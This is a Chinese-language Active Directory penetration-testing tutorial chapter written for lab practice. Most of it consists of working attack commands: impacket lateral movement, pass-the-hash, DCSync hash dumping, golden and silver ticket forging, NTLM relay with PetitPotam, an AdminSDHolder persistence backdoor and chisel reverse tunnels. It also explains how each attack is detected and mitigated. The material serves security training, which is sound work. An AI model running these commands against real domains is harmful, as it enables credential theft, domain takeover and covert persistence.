| **WMI** | 135 + 随机 | 通过 WMI 创建进程 | ★★★★ | 中等 |
| **SMBExec** | 445 | 写 SMB 服务 → 执行 | ★★★ | 留服务 |
| **atexec** | 445 | 建计划任务 → 执行 → 删除 | ★★★ | 留任务（短） |
| **PsExec** | 445 | 上传服务二进制 → 启动 | ★★ | **明显留服务** |

```bash
# --- 1. WinRM（最推荐）---
nxc winrm 192.168.64.20 -u alice -p 'Password123!' -d lab.local -x "whoami"
# 交互式：
evil-winrm -i 192.168.64.20 -u alice -p 'Password123!'

# --- 2. WMI ---
impacket-wmiexec lab.local/alice:'Password123!'@192.168.64.20

# --- 3. PsExec（会留服务，慎用）---
impacket-psexec lab.local/alice:'Password123!'@192.168.64.20

# --- 4. SMBExec ---
impacket-smbserve ... /  # 先起共享（可选）
impacket-smbexec lab.local/alice:'Password123!'@192.168.64.20

# --- 5. atexec（计划任务）---
impacket-atexec lab.local/alice:'Password123!'@192.168.64.20 "whoami"
```

**为什么 PsExec 最容易被发现？**

它的原理是：

```
1. 通过 SMB 把 psexesvc.exe 上传到目标的 ADMIN$ 共享（C:\Windows）
2. 远程创建服务，指向这个 exe
3. 启动服务 → exe 作为 SYSTEM 运行 → 给你一个 shell
4. 用完删除服务
```

问题在于：**第 2、3 步会在事件日志里留下明显的服务安装记录**（Event ID 7045）。
很多 EDR 直接告警"检测到 PsExec 横向"。

**WinRM 为什么更隐蔽？**

因为它走的是**正常的远程管理协议**（管理员本来就天天用），
且执行命令的日志和正常运维难以区分。

---

**哈希传递（PtH，Pass-the-Hash）**

**原理回顾**（1.3 节讲过）：NTLM 认证用的是密码哈希，不是密码本身。
所以**知道哈希 = 知道密码**（在网络认证层面）。

**为什么这很重要？**

- 破解哈希可能要几天甚至几周
- 但**横向不需要破解**！直接拿哈希就能用

```bash
# 1. 先 dump 出哈希（需要有目标的管理员权限）
impacket-secretsdump lab.local/alice:'Password123!'@192.168.64.20

# 输出：
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#                                              └────────── 这个就是 NT 哈希 ──────────┘

# 2. 用哈希横向（不需要破解）
nxc smb 192.168.64.20 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d lab.local
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.64.20

# 3. 域内多台机器复用同一个哈希
nxc smb 192.168.64.0/24 -u administrator -H <HASH> -d lab.local --continue-on-success
```

**PtH 的变体**：

| 变体 | 用什么 | 说明 |
|---|---|---|
| **PtH** | NTLM 哈希 | 经典 |
| **PtT**（Pass-the-Ticket） | Kerberos 票据（.ccache） | 更隐蔽，不留哈希 |
| **Overpass-the-Hash** | NTLM 哈希 → 换 Kerberos 票据 | 混合手法 |
| **PtK**（Pass-the-Key） | AES 密钥 | 当 RC4 被禁用时 |

```bash
# PtT 示例：拿到票据文件后直接用
export KRB5CCNAME=alice.ccache
impacket-wmiexec -k -no-pass lab.local/alice@web01.lab.local
```

---

**Kerberos 时间同步（超常见坑）**

Kerberos **要求客户端与 DC 的时钟误差不超过 5 分钟**（默认）。

**为什么？** 因为票据里带时间戳，用来防重放攻击。时间差太大，DC 会认为票据无效。

```bash
# 症状：报错 "KRB_AP_ERR_SKEW(Clock skew too great)"
sudo ntpdate $TARGET
# 或
rdate -n $TARGET
# 或在 impacket 里加 -dc-ip 的同时同步时间
```

---


---

### 3.6 第 6 步：拿下域控

**目标**：拿到 DC 上的所有账号哈希，并建立**持久、隐蔽**的访问。

---

#### 手法 A：DCSync（主流手法，原理要懂）

**为什么它叫 "DCSync"？**

因为它是**伪装成"域控之间的正常同步"**。

在多域控环境里，DC 之间需要同步数据（一个 DC 改了密码，其他 DC 要知道）。
这个同步用的是一个叫 **MS-DRSR（Directory Replication Service Remote Protocol）** 的协议。

**关键**：这个协议**没有任何"我是真的 DC"的强验证**——只要你有正确的权限，
就能调用它，让 DC 把密码哈希"复制"给你。

```
正常情况：
  DC01 ──MS-DRSR──→ DC02："把 alice 的密码哈希给我"
                      DC02："好的"（因为是另一个DC）

攻击者（有DCSync权限）：
  你  ──MS-DRSR──→ DC："把 administrator 的密码哈希给我"
                    DC："好的"（以为你是DC）
                      ↑
              你拿到了 administrator 的 NTLM 哈希
```

**需要什么权限？**

| 权限 | 说明 |
|---|---|
| `Replicating Directory Changes` | 基础复制权限 |
| `Replicating Directory Changes All` | **关键**，能复制所有属性（含密码） |
| `Replicating Directory Changes in Filtered Set` | 部分复制 |

默认只有 `Domain Admins`、`Enterprise Admins`、`Administrators` 有。
**但管理员经常错误地把这些权限授予其他账号**（如监控软件、备份工具的服务账号）。

```bash
# 需要 DCSync 权限（-just-dc 只导域控数据）
impacket-secretsdump lab.local/administrator:'AdminPass!'@$TARGET -just-dc

# 输出包含：
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# LAB\Administrator:500:aad3b435...:31d6cfe0d...:::      ← 管理员
# LAB\alice:1103:aad3b435...:a87f3b2c...:::
# LAB\krbtgt:502:aad3b435...:5d5b1ac9...:::              ← 关键！黄金票据的原料
```

**只导出 krbtgt**（最隐蔽，只拿黄金票据所需）：

```bash
impacket-secretsdump lab.local/administrator:'AdminPass!'@$TARGET -just-dc-user krbtgt
```

> **实战纪律**：DCSync 会**产生大量日志**（Event 4662）。
> 真实授权测试中，这通常被安排在最"一击致命"的位置，不做无谓的重复调用。

---

#### 手法 B：黄金票据（Golden Ticket）——原理讲透

**核心问题：为什么叫"黄金"？因为它能让你变成任何人，而且是永久的。**

**原理**：还记得 1.2 节的 TGT 吗？

```
TGT 加密密钥 = krbtgt 账号的 NTLM 哈希
```

**这意味着：只要我有 krbtgt 的哈希，我就能自己"造"一张 TGT。**

DC 收到这张 TGT 后，用**同样的 krbtgt 哈希**去解密——**能解开，就认为是自己签发的**。
DC 根本不知道这张票是你伪造的。

```
伪造过程：
  你手里有：krbtgt 的 NTLM 哈希 + 域 SID
  ↓
  你构造一个 TGT：
  ┌─────────────────────────────────────┐
  │ 用户名：Administrator                │  ← 随便填！
  │ 所属组：Domain Admins, ...           │  ← 随便填！
  │ 有效期：10 年                        │  ← 随便设！
  │ SID：S-1-5-21-xxx-500                │
  │ 权限：DCSync, Golden, ...            │  ← 关键特权
  └─────────────────────────────────────┘
  用 krbtgt 哈希加密 → 得到假 TGT
  ↓
  DC 解密成功 → "这是真的管理员" → 给你一切权限
```

**为什么说它"无敌"？**

| 特性 | 说明 |
|---|---|
| **不需要破解密码** | 只需要哈希（来自 DCSync） |
| **有效期任意** | 默认 10 年（普通票据 10 小时） |
| **可冒充任何人** | 包括不存在的用户 |
| **可加任意特权** | `SIDHistory` 注入、`ExtraSids` |
| **难以检测** | 票据看起来完全合法 |
| **可持久化** | 改密码也没用（krbtgt 哈希没变） |

**⚠️ 唯一命门：krbtgt 密码改了两次才失效。**

因为 AD 保留"当前"和"上一个"两代 krbtgt 密码。
企业要彻底清除黄金票据，必须**连续改两次 krbtgt 密码**（且在两次改密之间等待复制完成）。

```bash
# ---- 完整利用流程 ----

# 1. 拿到 krbtgt 哈希
impacket-secretsdump lab.local/administrator:'AdminPass!'@$TARGET -just-dc-user krbtgt
# 得到：Lab\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5d5b1ac9c8f2e3a7b1c4d6e8f0a2b4c6:::

# 2. 拿到域 SID
impacket-lookupsid lab.local/administrator:'AdminPass!'@$TARGET
# 输出：Domain SID is: S-1-5-21-1004336348-1177238915-682003330

# 3. 伪造 TGT（-user 指定要冒充谁，-id 指定 RID）
impacket-ticketer \
    -nthash 5d5b1ac9c8f2e3a7b1c4d6e8f0a2b4c6 \
    -domain-sid S-1-5-21-1004336348-1177238915-682003330 \
    -domain lab.local \
    -user administrator \
    -groups 512,513,518,519,520 \
    administrator
# 生成 administrator.ccache

# 4. 使用票据（关键：先设置环境变量）
export KRB5CCNAME=$PWD/administrator.ccache

# 5. 访问 DC（-k 表示用 Kerberos，-no-pass 表示不用密码）
impacket-psexec -k -no-pass lab.local/administrator@dc01.lab.local
# 或者更隐蔽的
impacket-wmiexec -k -no-pass lab.local/administrator@dc01.lab.local
```

**常用组的 RID（伪造时要加对）**：

| RID | 组名 | 用途 |
|---|---|---|
| 512 | Domain Admins | 域管理员 |
| 513 | Domain Users | 域用户 |
| 518 | Schema Admins | 架构管理员 |
| 519 | Enterprise Admins | 企业管理员（跨域） |
| 520 | Group Policy Creator Owners | 组策略创建者 |

---

#### 手法 C：白银票据（Silver Ticket）

**对比黄金票据**：

| | 黄金票据 | 白银票据 |
|---|---|---|
| 伪造对象 | TGT（给 DC 看） | 服务票据（给某个服务看） |
| 需要密钥 | **krbtgt 哈希** | 某**服务账号**的哈希 |
| 作用范围 | **整个域** | 仅该服务 |
| 是否联系 DC | 是（要换服务票据） | **否**（直接给服务） |
| 隐蔽性 | 中（DC 有日志） | **高**（不经过 DC） |

**白银票据的特点：全程不接触 DC**，所以**日志更少，更难发现**。
缺点是只能访问特定服务（如某台机器的 CIFS、某台 SQL 的 MSSQLSvc）。

```bash
impacket-ticketer \
    -nthash <服务账号的哈希> \
    -domain-sid <域SID> -domain lab.local \
    -spn cifs/web01.lab.local \
    -user administrator \
    silver_ticket
export KRB5CCNAME=$PWD/silver_ticket.ccache
impacket-smbclient -k -no-pass web01.lab.local
```

---

#### 手法 D：ntlmrelayx + 强制认证（不靠抓密码）

**原理**：不破解任何密码，而是**诱骗目标机器主动来认证你**，然后把认证**转发给 DC**。

```
① 你监听（ntlmrelayx）
② 触发目标机器来认证你（多种触发方式）
③ 你把这次认证中继到 DC
④ DC 以为是目标机器在认证 → 给你权限
```

**为什么能成功？** 因为 NTLM 认证**不绑定目标**——
目标机器发来的认证包，可以原样转发给 DC。

```bash
# 1. 起中继监听（-socks 开启 SOCKS 代理方便后续操作）
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# 2. 触发目标（示例：用 PetitPotam 强制 DC 认证）
python3 PetitPotam.py <你的IP> <DC_IP>

# 3. 检查中继结果
# 在 ntlmrelayx 交互里输入：socks
# 然后 proxychains 使用

# 4. 防御相关（了解原理才知道怎么防）：
#    - 启用 SMB 签名
#    - 启用 LDAP 签名/通道绑定
#    - 禁用 NTLM
```

**常见"强制认证"触发点**：

| 方法 | 原理 | 补丁状态 |
|---|---|---|
| **PetitPotam** | MS-EFSRPC 强制认证 | 已修补（多数） |
| **PrinterBug** | MS-RPRN 打印服务 | 常未修 |
| **DFSCoerce** | MS-DFSNM | 部分未修 |
| **ShadowCoerce** | MS-FSRVP | 部分未修 |
| **WebDAV 触发** | 诱导访问 UNC 路径 | — |

---

#### 3.7 权限维持（Persistence）

拿到 DC 后，如果想保持访问（授权测试中会评估这一点）：

| 手法 | 原理 | 隐蔽性 |
|---|---|---|
| **黄金票据** | krbtgt 哈希伪造 | ★★★★★ |
| **DSRM 后门** | DC 的本地管理员（改注册表后可远程用） | ★★★★ |
| **AdminSDHolder** | 每 60 分钟自动同步 ACL 到特权组 | ★★★★★ |
| **SIDHistory 注入** | 把 DA 的 SID 加到自己账号 | ★★★★ |
| **金钥匙 / 证书后门** | 伪造 CA 证书 | ★★★★★ |
| **计划任务 / 服务** | 常规持久化 | ★★ |

```bash
# AdminSDHolder 后门示例（极其隐蔽）
# 给 alice 加 AdminSDHolder 的完全控制权限
# 60 分钟后，AD 自动把这个权限同步到所有特权组 → alice 自动变成 DA
impacket-dacledit -action write -rights FullControl \
    -principal alice -target-dn "CN=AdminSDHolder,CN=System,DC=lab,DC=local" \
    lab.local/administrator:'AdminPass!'
```

---


## 4. 免费靶场题单

### 4.1 TryHackMe（免费房间）

| # | 房间 | 学什么 | 完成 |
|---|---|---|---|
| 1 | **Attacktive Directory** | AD 渗透入门五连击 | ☐ |
| 2 | **Attacking Kerberos** | Kerberoasting / AS-REP | ☐ |
| 3 | Active Directory Basics | AD 概念 | ☐ |
| 4 | Intro to LAN | 网络基础（复习） | ☐ |
| 5 | Windows Fundamentals 1–3 | Windows 系统 | ☐ |

**Attacktive Directory 标准流程**（官方房间）：

```bash
# 1. 信息收集
nmap -Pn -sV -p- <IP>
enum4linux-ng -A <IP>

# 2. 从 Web 找用户名（该房间特色）
# 访问 http://<IP>/ 找员工名单

# 3. Kerberos 枚举
kerbrute userenum --dc <IP> -d spookysec.local users.txt

# 4. AS-REP Roasting
impacket-GetNPUsers spookysec.local/svc-admin:<pass> -dc-ip <IP>

# 5. SMB 拿凭据
smbclient //<IP>/backup -U svc-admin

# 6. BloodHound 找路径 → DCSync → 拿下
impacket-secretsdump spookysec.local/backup:<pass>@<IP>
```

### 4.2 Hack The Box Starting Point（免费）

| # | 机器 | 知识点 | 完成 |
|---|---|---|---|
| 1 | Meow | Telnet 弱口令 | ☐ |
| 2 | Fawn | FTP 匿名 | ☐ |
| 3 | Dancing | SMB | ☐ |
| 4 | Redeemer | Redis 未授权 | ☐ |
| 5 | Explosion | RDP | ☐ |
| 6 | Preignition | Web 弱口令 | ☐ |
| 7 | Mongod | MongoDB 未授权 | ☐ |
| 8 | Synced | Rsync 未授权 | ☐ |
| 9 | Appointment | SQL 注入 | ☐ |
| 10 | Sequel | MySQL | ☐ |

```bash
# 连接 HTB VPN 后即可开始
# 每周还有 2 台免费退役机
```

### 4.3 HackMyVM（完全免费）

**网站**：https://hackmyvm.eu/

下载 OVA → 导入 UTM → 练习。有专门的 AD/Windows 机器分类。

---

## 5. 内网工具速查表

| 工具 | 用途 | 示例 |
|---|---|---|
| `nxc` (netexec) | 多协议批量操作 | `nxc smb 10.0.0.0/24 -u u -p p` |
| `impacket-GetNPUsers` | AS-REP Roasting | 见 3.2 |
| `impacket-GetUserSPNs` | Kerberoasting | 见 3.2 |
| `impacket-secretsdump` | 导出哈希 | `-just-dc` 只导域 |
| `impacket-wmiexec` | WMI 横向 | 隐蔽性好 |
| `impacket-psexec` | PsExec 横向 | 会留服务 |
| `impacket-atexec` | 计划任务执行 | — |
| `impacket-smbclient` | SMB 交互 | — |
| `impacket-getTGT` | 请求 TGT | — |
| `impacket-ticketer` | 伪造票据 | 黄金/白银票据 |
| `impacket-ntlmrelayx` | NTLM 中继 | — |
| `bloodhound-python` | AD 数据收集 | 配合 BloodHound 分析 |
| `enum4linux-ng` | 综合枚举 | 无凭据信息收集 |
| `certipy` | AD CS 攻击 | ESC1–ESC8 |
| `proxychains4` | 代理链 | 过隧道用 |
| `rpcclient` | RPC 枚举 | `enumdomusers` |

---

## 6. 隧道与代理（打内网必需）

拿到一台内网机器后，需要**把内网流量代理出来**：

```bash
# 方案 1：chisel（最常用，HTTP 封装）
# VPS 侧
chisel server -p 8080 --reverse
# 目标侧
./chisel client <VPS>:8080 R:socks

# 方案 2：frp（稳定）
# 见技能 frp-tunnel

# 方案 3：suo5（通过 WebShell 建 SOCKS5）
# 见技能 suo5-tunnel

# 方案 4：ssh 动态转发（有 SSH 权限时）
ssh -D 1080 user@target

# 使用代理
proxychains4 nxc smb 10.10.10.0/24 -u user -p pass
```

> 本会话内置技能：`chisel-tunnel`、`frp-tunnel`、`suo5-tunnel`、`lateral-movement`、`fscan-intranet`、`gogo-intranet`。

---

## 7. 阶段 4 自测清单

- [ ] 能解释 Kerberos 认证的完整流程
- [ ] 能说出 AS-REP Roasting 和 Kerberoasting 的区别
- [ ] 会用 enum4linux-ng / nxc 做无凭据枚举
- [ ] 完成一次 AS-REP Roasting 并破解出密码
- [ ] 完成一次 Kerberoasting 并破解出密码
- [ ] 会用 bloodhound-python 收集数据并分析路径
- [ ] 能用 5 种方式做横向移动
- [ ] 理解 PtH（哈希传递）原理
- [ ] 完成一次 DCSync 导出域内哈希
- [ ] 能伪造黄金票据
- [ ] 会用 chisel/proxychains 打通内网
- [ ] THM `Attacktive Directory` 完成
- [ ] THM `Attacking Kerberos` 完成
- [ ] HTB Starting Point 前 10 台完成
- [ ] 本地自建 AD 靶场完整走通：枚举 → Kerberoasting → 横向 → 拿下 DC

---

## 8. 卡住了怎么办

| 现象 | 排查 |
|---|---|
| `nxc` 报未找到协议 | 确认语法：`nxc smb <target>`，协议在前 |
| AS-REP 请求无输出 | 该账号可能没关闭预认证，换个账号试 |
| Kerberoasting 破解不出 | 密码可能很强；检查 hashcat `-m` 模式（13100） |
| BloodHound 没数据 | 确认 `-ns` 指向 DC 的 DNS；加 `-c all` |
| 横向失败 | 确认目标机器上该用户是本地管理员 |
| 时钟不同步导致 Kerberos 失败 | `ntpdate <DC_IP>` 或 `rdate -n <DC_IP>` |
| 隧道建不起来 | 检查出网限制；换 chisel HTTP 模式 |
| VM 之间不通 | 检查 UTM 网络模式（共享网络/Bridged） |

**Kerberos 时间同步**（非常常见的问题）：

```bash
# Kerberos 要求时钟误差 < 5 分钟
sudo ntpdate <DC_IP>
# 或
rdate -n <DC_IP>
```

---

## 9. 下一章预告

第 5 章是**实战化与持续输出**：把前面学的全部串起来，
打真实的完整靶机，写专业级 walkthrough，形成自己的作品集。

→ [05-practice-and-output.md](05-practice-and-output.md)

---

*本章文档位于 `runs/cyber-roadmap/docs/04-internal-network-and-ad.md`*
